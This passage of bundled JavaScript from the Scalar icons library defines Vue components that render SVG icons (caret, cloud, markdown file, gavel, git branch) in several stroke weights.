"M39.91,128a27.68,27.68,0,0,1,9.49,11.13C54,148.62,54,160.51,54,172c0,24.27,1.21,38,26,38a6,6,0,0,1,0,12c-16.88,0-27.81-5.6-33.4-17.13C42,195.38,42,183.49,42,172c0-24.27-1.21-38-26-38a6,6,0,0,1,0-12c24.79,0,26-13.73,26-38,0-11.49,0-23.38,4.6-32.87C52.19,39.6,63.12,34,80,34a6,6,0,0,1,0,12C55.21,46,54,59.73,54,84c0,11.49,0,23.38-4.6,32.87A27.68,27.68,0,0,1,39.91,128ZM240,122c-24.79,0-26-13.73-26-38,0-11.49,0-23.38-4.6-32.87C203.81,39.6,192.88,34,176,34a6,6,0,0,0,0,12c24.79,0,26,13.73,26,38,0,11.49,0,23.38,4.6,32.87A27.68,27.68,0,0,0,216.09,128a27.68,27.68,0,0,0-9.49,11.13C202,148.62,202,160.51,202,172c0,24.27-1.21,38-26,38a6,6,0,0,0,0,12c16.88,0,27.81-5.6,33.4-17.13,4.6-9.49,4.6-21.38,4.6-32.87,0-24.27,1.21-38,26-38a6,6,0,0,0,0-12Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$40, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M43.18,128a29.78,29.78,0,0,1,8,10.26c4.8,9.9,4.8,22,4.8,33.74,0,24.31,1,36,24,36a8,8,0,0,1,0,16c-17.48,0-29.32-6.14-35.2-18.26-4.8-9.9-4.8-22-4.8-33.74,0-24.31-1-36-24-36a8,8,0,0,1,0-16c23,0,24-11.69,24-36,0-11.72,0-23.84,4.8-33.74C50.68,38.14,62.52,32,80,32a8,8,0,0,1,0,16C57,48,56,59.69,56,84c0,11.72,0,23.84-4.8,33.74A29.78,29.78,0,0,1,43.18,128ZM240,120c-23,0-24-11.69-24-36,0-11.72,0-23.84-4.8-33.74C205.32,38.14,193.48,32,176,32a8,8,0,0,0,0,16c23,0,24,11.69,24,36,0,11.72,0,23.84,4.8,33.74a29.78,29.78,0,0,0,8,10.26,29.78,29.78,0,0,0-8,10.26c-4.8,9.9-4.8,22-4.8,33.74,0,24.31-1,36-24,36a8,8,0,0,0,0,16c17.48,0,29.32-6.14,35.2-18.26,4.8-9.9,4.8-22,4.8-33.74,0-24.31,1-36,24-36a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$35, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M35.89,128C52,136.23,52,155.64,52,172c0,24.8,1.35,40,28,40a4,4,0,0,1,0,8c-36,0-36-26.61-36-48,0-24.8-1.35-40-28-40a4,4,0,0,1,0-8c26.65,0,28-15.2,28-40,0-21.39,0-48,36-48a4,4,0,0,1,0,8C53.35,44,52,59.2,52,84,52,100.36,52,119.77,35.89,128ZM240,124c-26.65,0-28-15.2-28-40,0-21.39,0-48-36-48a4,4,0,0,0,0,8c26.65,0,28,15.2,28,40,0,16.36,0,35.77,16.11,44C204,136.23,204,155.64,204,172c0,24.8-1.35,40-28,40a4,4,0,0,0,0,8c36,0,36-26.61,36-48,0-24.8,1.35-40,28-40a4,4,0,0,0,0-8Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconCaretUpDown.vue.script.js
var _hoisted_1$123 = { key: 0 };
var _hoisted_2$85 = { key: 1 };
var _hoisted_3$66 = { key: 2 };
var _hoisted_4$49 = { key: 3 };
var _hoisted_5$39 = { key: 4 };
var _hoisted_6$34 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconCaretUpDown.js
var ScalarIconCaretUpDown_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconCaretUpDown",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$123, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M184.49,167.51a12,12,0,0,1,0,17l-48,48a12,12,0,0,1-17,0l-48-48a12,12,0,0,1,17-17L128,207l39.51-39.52A12,12,0,0,1,184.49,167.51Zm-96-79L128,49l39.51,39.52a12,12,0,0,0,17-17l-48-48a12,12,0,0,0-17,0l-48,48a12,12,0,0,0,17,17Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$85, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M80,176h96l-48,48ZM128,32,80,80h96Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M176,168H80a8,8,0,0,0-5.66,13.66l48,48a8,8,0,0,0,11.32,0l48-48A8,8,0,0,0,176,168Zm-48,44.69L99.31,184h57.38ZM80,88h96a8,8,0,0,0,5.66-13.66l-48-48a8,8,0,0,0-11.32,0l-48,48A8,8,0,0,0,80,88Zm48-44.69L156.69,72H99.31Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$66, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M72.61,83.06a8,8,0,0,1,1.73-8.72l48-48a8,8,0,0,1,11.32,0l48,48A8,8,0,0,1,176,88H80A8,8,0,0,1,72.61,83.06ZM176,168H80a8,8,0,0,0-5.66,13.66l48,48a8,8,0,0,0,11.32,0l48-48A8,8,0,0,0,176,168Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$49, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M180.24,171.76a6,6,0,0,1,0,8.48l-48,48a6,6,0,0,1-8.48,0l-48-48a6,6,0,0,1,8.48-8.48L128,215.51l43.76-43.75A6,6,0,0,1,180.24,171.76Zm-96-87.52L128,40.49l43.76,43.75a6,6,0,0,0,8.48-8.48l-48-48a6,6,0,0,0-8.48,0l-48,48a6,6,0,0,0,8.48,8.48Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$39, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M181.66,170.34a8,8,0,0,1,0,11.32l-48,48a8,8,0,0,1-11.32,0l-48-48a8,8,0,0,1,11.32-11.32L128,212.69l42.34-42.35A8,8,0,0,1,181.66,170.34Zm-96-84.68L128,43.31l42.34,42.35a8,8,0,0,0,11.32-11.32l-48-48a8,8,0,0,0-11.32,0l-48,48A8,8,0,0,0,85.66,85.66Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$34, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M178.83,173.17a4,4,0,0,1,0,5.66l-48,48a4,4,0,0,1-5.66,0l-48-48a4,4,0,0,1,5.66-5.66L128,218.34l45.17-45.17A4,4,0,0,1,178.83,173.17Zm-96-90.34L128,37.66l45.17,45.17a4,4,0,1,0,5.66-5.66l-48-48a4,4,0,0,0-5.66,0l-48,48a4,4,0,0,0,5.66,5.66Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconCloud.vue.script.js
var _hoisted_1$122 = { key: 0 };
var _hoisted_2$84 = { key: 1 };
var _hoisted_3$65 = { key: 2 };
var _hoisted_4$48 = { key: 3 };
var _hoisted_5$38 = { key: 4 };
var _hoisted_6$33 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconCloud.js
var ScalarIconCloud_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconCloud",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$122, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M160,36A92.09,92.09,0,0,0,79,84.36,68,68,0,1,0,72,220h88a92,92,0,0,0,0-184Zm0,160H72a44,44,0,0,1-1.82-88A91.86,91.86,0,0,0,68,128a12,12,0,0,0,24,0,68,68,0,1,1,68,68Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$84, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M240,128a80,80,0,0,1-80,80H72A56,56,0,1,1,85.92,97.74l0,.1A80,80,0,0,1,240,128Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M160,40A88.09,88.09,0,0,0,81.29,88.67,64,64,0,1,0,72,216h88a88,88,0,0,0,0-176Zm0,160H72a48,48,0,0,1,0-96c1.1,0,2.2,0,3.29.11A88,88,0,0,0,72,128a8,8,0,0,0,16,0,72,72,0,1,1,72,72Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$65, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M160.06,40A88.1,88.1,0,0,0,81.29,88.67h0A87.48,87.48,0,0,0,72,127.73,8.18,8.18,0,0,1,64.57,136,8,8,0,0,1,56,128a103.66,103.66,0,0,1,5.34-32.92,4,4,0,0,0-4.75-5.18A64.09,64.09,0,0,0,8,152c0,35.19,29.75,64,65,64H160a88.09,88.09,0,0,0,87.93-91.48C246.11,77.54,207.07,40,160.06,40Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$48, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M160,42A86.11,86.11,0,0,0,82.43,90.88,62,62,0,1,0,72,214h88a86,86,0,0,0,0-172Zm0,160H72a50,50,0,0,1,0-100,50.67,50.67,0,0,1,5.91.35A85.61,85.61,0,0,0,74,128a6,6,0,0,0,12,0,74,74,0,1,1,74,74Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$38, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M160,40A88.09,88.09,0,0,0,81.29,88.67,64,64,0,1,0,72,216h88a88,88,0,0,0,0-176Zm0,160H72a48,48,0,0,1,0-96c1.1,0,2.2,0,3.29.11A88,88,0,0,0,72,128a8,8,0,0,0,16,0,72,72,0,1,1,72,72Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$33, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M160,44A84.11,84.11,0,0,0,83.59,93.12,60.71,60.71,0,0,0,72,92a60,60,0,0,0,0,120h88a84,84,0,0,0,0-168Zm0,160H72a52,52,0,1,1,8.55-103.3A83.66,83.66,0,0,0,76,128a4,4,0,0,0,8,0,76,76,0,1,1,76,76Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconFileMd.vue.script.js
var _hoisted_1$121 = { key: 0 };
var _hoisted_2$83 = { key: 1 };
var _hoisted_3$64 = { key: 2 };
var _hoisted_4$47 = { key: 3 };
var _hoisted_5$37 = { key: 4 };
var _hoisted_6$32 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconFileMd.js
var ScalarIconFileMd_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconFileMd",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$121, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M100,152v56a12,12,0,0,1-24,0V190.07l-6.17,8.81a12,12,0,0,1-19.66,0L44,190.07V208a12,12,0,0,1-24,0V152a12,12,0,0,1,21.83-6.88L60,171.07l18.17-25.95A12,12,0,0,1,100,152Zm84,28a40,40,0,0,1-40,40H128a12,12,0,0,1-12-12V152a12,12,0,0,1,12-12h16A40,40,0,0,1,184,180Zm-24,0a16,16,0,0,0-16-16h-4v32h4A16,16,0,0,0,160,180Zm60-92V224a12,12,0,0,1-24,0V104H148a12,12,0,0,1-12-12V44H60v64a12,12,0,0,1-24,0V40A20,20,0,0,1,56,20h96a12,12,0,0,1,8.49,3.52l56,56A12,12,0,0,1,220,88Zm-60-8h23L160,57Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$83, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M208,88H152V32Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M213.66,82.34l-56-56A8,8,0,0,0,152,24H56A16,16,0,0,0,40,40v72a8,8,0,0,0,16,0V40h88V88a8,8,0,0,0,8,8h48V224a8,8,0,0,0,16,0V88A8,8,0,0,0,213.66,82.34ZM160,51.31,188.69,80H160ZM144,144H128a8,8,0,0,0-8,8v56a8,8,0,0,0,8,8h16a36,36,0,0,0,0-72Zm0,56h-8V160h8a20,20,0,0,1,0,40Zm-40-48v56a8,8,0,0,1-16,0V177.38L74.55,196.59a8,8,0,0,1-13.1,0L48,177.38V208a8,8,0,0,1-16,0V152a8,8,0,0,1,14.55-4.59L68,178.05l21.45-30.64A8,8,0,0,1,104,152Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$64, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M213.66,82.34l-56-56A8,8,0,0,0,152,24H56A16,16,0,0,0,40,40v76a4,4,0,0,0,4,4H196a4,4,0,0,1,4,4V224a8,8,0,0,0,9.19,7.91,8.15,8.15,0,0,0,6.81-8.16V88A8,8,0,0,0,213.66,82.34ZM152,88V44l44,44Zm-8,56H128a8,8,0,0,0-8,8v56a8,8,0,0,0,8,8h15.32c19.66,0,36.21-15.48,36.67-35.13A36,36,0,0,0,144,144Zm-.49,56H136V160h8a20,20,0,0,1,20,20.77C163.58,191.59,154.34,200,143.51,200ZM104,152v55.73A8.17,8.17,0,0,1,96.53,216,8,8,0,0,1,88,208V177.38l-13.32,19a8.3,8.3,0,0,1-4.2,3.2,8,8,0,0,1-9-3L48,177.38v30.35A8.17,8.17,0,0,1,40.53,216,8,8,0,0,1,32,208V152.31a8.27,8.27,0,0,1,4.56-7.53,8,8,0,0,1,10,2.63L68,178.05l21.27-30.39a8.28,8.28,0,0,1,8.06-3.55A8,8,0,0,1,104,152Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$47, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M212.24,83.76l-56-56A6,6,0,0,0,152,26H56A14,14,0,0,0,42,40v72a6,6,0,0,0,12,0V40a2,2,0,0,1,2-2h90V88a6,6,0,0,0,6,6h50V224a6,6,0,0,0,12,0V88A6,6,0,0,0,212.24,83.76ZM158,46.48,193.52,82H158ZM144,146H128a6,6,0,0,0-6,6v56a6,6,0,0,0,6,6h16a34,34,0,0,0,0-68Zm0,56H134V158h10a22,22,0,0,1,0,44Zm-42-50v56a6,6,0,0,1-12,0V171L72.92,195.44a6,6,0,0,1-9.84,0L46,171v37a6,6,0,0,1-12,0V152a6,6,0,0,1,10.92-3.44l23.08,33,23.08-33A6,6,0,0,1,102,152Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$37, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M213.66,82.34l-56-56A8,8,0,0,0,152,24H56A16,16,0,0,0,40,40v72a8,8,0,0,0,16,0V40h88V88a8,8,0,0,0,8,8h48V224a8,8,0,0,0,16,0V88A8,8,0,0,0,213.66,82.34ZM160,51.31,188.69,80H160ZM144,144H128a8,8,0,0,0-8,8v56a8,8,0,0,0,8,8h16a36,36,0,0,0,0-72Zm0,56h-8V160h8a20,20,0,0,1,0,40Zm-40-48v56a8,8,0,0,1-16,0V177.38L74.55,196.59a8,8,0,0,1-13.1,0L48,177.38V208a8,8,0,0,1-16,0V152a8,8,0,0,1,14.55-4.59L68,178.05l21.45-30.64A8,8,0,0,1,104,152Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$32, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M210.83,85.17l-56-56A4,4,0,0,0,152,28H56A12,12,0,0,0,44,40v72a4,4,0,0,0,8,0V40a4,4,0,0,1,4-4h92V88a4,4,0,0,0,4,4h52V224a4,4,0,0,0,8,0V88A4,4,0,0,0,210.83,85.17ZM156,41.65,198.34,84H156ZM144,148H128a4,4,0,0,0-4,4v56a4,4,0,0,0,4,4h16a32,32,0,0,0,0-64Zm0,56H132V156h12a24,24,0,0,1,0,48Zm-44-52v56a4,4,0,0,1-8,0V164.69l-20.72,29.6a4,4,0,0,1-6.56,0L44,164.69V208a4,4,0,0,1-8,0V152a4,4,0,0,1,7.28-2.29L68,185l24.72-35.31A4,4,0,0,1,100,152Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGavel.vue.script.js
var _hoisted_1$120 = { key: 0 };
var _hoisted_2$82 = { key: 1 };
var _hoisted_3$63 = { key: 2 };
var _hoisted_4$46 = { key: 3 };
var _hoisted_5$36 = { key: 4 };
var _hoisted_6$31 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGavel.js
var ScalarIconGavel_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconGavel",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$120, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M246.14,113.86l-16-16a20,20,0,0,0-23.06-3.75l-45.2-45.2a20,20,0,0,0-3.74-23.06l-16-16a20,20,0,0,0-28.28,0l-64,64a20,20,0,0,0,0,28.28l16,16a20,20,0,0,0,23,3.79L29.36,181.38a32,32,0,0,0,45.26,45.26L134,167.21a20,20,0,0,0,3.81,22.94l16,16a20,20,0,0,0,28.29,0l64-64a20,20,0,0,0,0-28.29ZM80,98.34,69.64,88,128,29.65,138.34,40ZM57.64,209.67a8,8,0,0,1-11.31-11.32l59.52-59.52,11.31,11.32Zm92.7-60.29-43.72-43.72,39-39,43.72,43.72Zm17.65,37L157.65,176,216,117.66,226.34,128Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$82, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M149.66,45.66l-64,64a8,8,0,0,1-11.32,0l-16-16a8,8,0,0,1,0-11.32l64-64a8,8,0,0,1,11.32,0l16,16A8,8,0,0,1,149.66,45.66Zm88,76.68-16-16a8,8,0,0,0-11.32,0l-64,64a8,8,0,0,0,0,11.32l16,16a8,8,0,0,0,11.32,0l64-64A8,8,0,0,0,237.66,122.34Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M243.32,116.69l-16-16a16,16,0,0,0-20.84-1.53L156.84,49.52a16,16,0,0,0-1.52-20.84l-16-16a16,16,0,0,0-22.63,0l-64,64a16,16,0,0,0,0,22.63l16,16a16,16,0,0,0,20.83,1.52L96.69,124,31.31,189.38A25,25,0,0,0,66.63,224.7L132,159.32l7.17,7.16a16,16,0,0,0,1.52,20.84l16,16a16,16,0,0,0,22.63,0l64-64A16,16,0,0,0,243.32,116.69ZM80,104,64,88l64-64,16,16ZM55.32,213.38a9,9,0,0,1-12.69,0,9,9,0,0,1,0-12.68L108,135.32,120.69,148ZM101,105.66,145.66,61,195,110.34,150.35,155ZM168,192l-16-16,4-4h0l56-56h0l4-4,16,16Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$63, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M52.69,99.31a16,16,0,0,1,0-22.63l64-64a16,16,0,0,1,22.63,22.63l-64,64a16,16,0,0,1-22.63,0Zm190.63,17.37a16,16,0,0,0-22.63,0l-64,64a16,16,0,0,0,0,22.63h0a16,16,0,0,0,22.63,0l64-64A16,16,0,0,0,243.32,116.68Zm-35.11-15.8L155.12,47.79a4,4,0,0,0-5.66,0L87.8,109.45a4,4,0,0,0,0,5.66L103,130.34,28.69,204.69a16,16,0,0,0,22.62,22.62L125.66,153l15.23,15.23a4,4,0,0,0,5.66,0l61.66-61.66A4,4,0,0,0,208.21,100.88Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$46, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M241.91,118.1l-16-16a14,14,0,0,0-19.55-.23L154.13,49.64a14,14,0,0,0-.23-19.55l-16-16a14,14,0,0,0-19.8,0l-64,64a14,14,0,0,0,0,19.8l16,16a14,14,0,0,0,19.55.23L99.52,124,32.73,190.79a23,23,0,0,0,32.48,32.49L132,156.49l9.87,9.87a14,14,0,0,0,.23,19.55l16,16a14,14,0,0,0,19.8,0l64-64A14,14,0,0,0,241.91,118.1Zm-91.56,39.76-52.21-52.2,47.52-47.52,52.2,52.2ZM78.59,105.41l-16-16a2,2,0,0,1,0-2.83l64-64a2,2,0,0,1,2.83,0l16,16a2,2,0,0,1,0,2.83l-64,64A2,2,0,0,1,78.59,105.41ZM56.73,214.8a11,11,0,0,1-15.52-15.52L108,132.49,123.52,148Zm176.69-85.38-64,64a2,2,0,0,1-2.83,0l-16-16a2,2,0,0,1,0-2.83l64-64a2,2,0,0,1,2.83,0l16,16A2,2,0,0,1,233.42,129.42Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$36, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M243.32,116.69l-16-16a16,16,0,0,0-20.84-1.53L156.84,49.52a16,16,0,0,0-1.52-20.84l-16-16a16,16,0,0,0-22.63,0l-64,64a16,16,0,0,0,0,22.63l16,16a16,16,0,0,0,20.83,1.52L96.69,124,31.31,189.38A25,25,0,0,0,66.63,224.7L132,159.32l7.17,7.16a16,16,0,0,0,1.52,20.84l16,16a16,16,0,0,0,22.63,0l64-64A16,16,0,0,0,243.32,116.69ZM80,104,64,88l64-64,16,16ZM55.32,213.38a9,9,0,0,1-12.69,0,9,9,0,0,1,0-12.68L108,135.32,120.69,148ZM101,105.66,145.66,61,195,110.34,150.35,155ZM168,192l-16-16,4-4h0l56-56h0l4-4,16,16Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$31, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M240.49,119.52l-16-16a12,12,0,0,0-17,0l-1.17,1.17-55-55,1.18-1.17a12,12,0,0,0,0-17l-16-16a12,12,0,0,0-17,0l-64,64a12,12,0,0,0,0,17l16,16a12,12,0,0,0,17,0l1.17-1.18L102.34,124l-68.2,68.21A21,21,0,0,0,63.8,221.87L132,153.66l12.69,12.69-1.18,1.17a12,12,0,0,0,0,17l16,16a12,12,0,0,0,17,0l64-64a12,12,0,0,0,0-17ZM77.17,106.83l-16-16a4,4,0,0,1,0-5.66l64-64a4,4,0,0,1,5.66,0l16,16a4,4,0,0,1,0,5.65l-64,64A4,4,0,0,1,77.17,106.83Zm-19,109.38A13,13,0,1,1,39.8,197.87L108,129.66,126.34,148ZM95.31,105.66l50.35-50.35,55,55-50.35,50.35Zm139.52,25.17-64,64a4,4,0,0,1-5.66,0l-16-16a4,4,0,0,1,0-5.65l64-64a4,4,0,0,1,5.66,0l16,16a4,4,0,0,1,0,5.66Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGitBranch.vue.script.js
var _hoisted_1$119 = { key: 0 };
var _hoisted_2$81 = { key: 1 };
var _hoisted_3$62 = { key: 2 };
var _hoisted_4$45 = { key: 3 };
var _hoisted_5$35 = { key: 4 };
var _hoisted_6$30 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGitBranch.js
var ScalarIconGitBranch_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconGitBranch",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$119, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M236,64a36,36,0,1,0-48,33.94V112a4,4,0,0,1-4,4H96a27.8,27.8,0,0,0-4,.29V97.94a36,36,0,1,0-24,0v60.12a36,36,0,1,0,24,0V144a4,4,0,0,1,4-4h88a28,28,0,0,0,28-28V97.94A36.07,36.07,0,0,0,236,64ZM80,52A12,12,0,1,1,68,64,12,12,0,0,1,80,52Zm0,152a12,12,0,1,1,12-12A12,12,0,0,1,80,204ZM200,76a12,12,0,1,1,12-12A12,12,0,0,1,200,76Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$81, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M224,64a24,24,0,1,1-24-24A24,24,0,0,1,224,64Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M232,64a32,32,0,1,0-40,31v17a8,8,0,0,1-8,8H96a23.84,23.84,0,0,0-8,1.38V95a32,32,0,1,0-16,0v66a32,32,0,1,0,16,0V144a8,8,0,0,1,8-8h88a24,24,0,0,0,24-24V95A32.06,32.06,0,0,0,232,64ZM64,64A16,16,0,1,1,80,80,16,16,0,0,1,64,64ZM96,192a16,16,0,1,1-16-16A16,16,0,0,1,96,192ZM200,80a16,16,0,1,1,16-16A16,16,0,0,1,200,80Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$62, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M232,64a32,32,0,1,0-40,31v17a8,8,0,0,1-8,8H96a23.84,23.84,0,0,0-8,1.38V95a32,32,0,1,0-16,0v66a32,32,0,1,0,16,0V144a8,8,0,0,1,8-8h88a24,24,0,0,0,24-24V95A32.06,32.06,0,0,0,232,64ZM64,64A16,16,0,1,1,80,80,16,16,0,0,1,64,64ZM96,192a16,16,0,1,1-16-16A16,16,0,0,1,96,192Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$45, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M230,64a30,30,0,1,0-36,29.4V112a10,10,0,0,1-10,10H96a21.84,21.84,0,0,0-10,2.42v-31a30,30,0,1,0-12,0v69.2a30,30,0,1,0,12,0V144a10,10,0,0,1,10-10h88a22,22,0,0,0,22-22V93.4A30.05,30.05,0,0,0,230,64ZM62,64A18,18,0,1,1,80,82,18,18,0,0,1,62,64ZM98,192a18,18,0,1,1-18-18A18,18,0,0,1,98,192ZM200,82a18,18,0,1,1,18-18A18,18,0,0,1,200,82Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$35, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M232,64a32,32,0,1,0-40,31v17a8,8,0,0,1-8,8H96a23.84,23.84,0,0,0-8,1.38V95a32,32,0,1,0-16,0v66a32,32,0,1,0,16,0V144a8,8,0,0,1,8-8h88a24,24,0,0,0,24-24V95A32.06,32.06,0,0,0,232,64ZM64,64A16,16,0,1,1,80,80,16,16,0,0,1,64,64ZM96,192a16,16,0,1,1-16-16A16,16,0,0,1,96,192ZM200,80a16,16,0,1,1,16-16A16,16,0,0,1,200,80Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$30, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M228,64a28,28,0,1,0-32,27.71V112a12,12,0,0,1-12,12H96a19.91,19.91,0,0,0-12,4V91.71a28,28,0,1,0-8,0v72.58a28,28,0,1,0,8,0V144a12,12,0,0,1,12-12h88a20,20,0,0,0,20-20V91.71A28,28,0,0,0,228,64ZM60,64A20,20,0,1,1,80,84,20,20,0,0,1,60,64Zm40,128a20,20,0,1,1-20-20A20,20,0,0,1,100,192ZM200,84a20,20,0,1,1,20-20A20,20,0,0,1,200,84Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGlobeSimple.vue.script.js
var _hoisted_1$118 = { key: 0 };
var _hoisted_2$80 = { key: 1 };
var _hoisted_3$61 = { key: 2 };
var _hoisted_4$44 = { key: 3 };
var _hoisted_5$34 = { key: 4 };
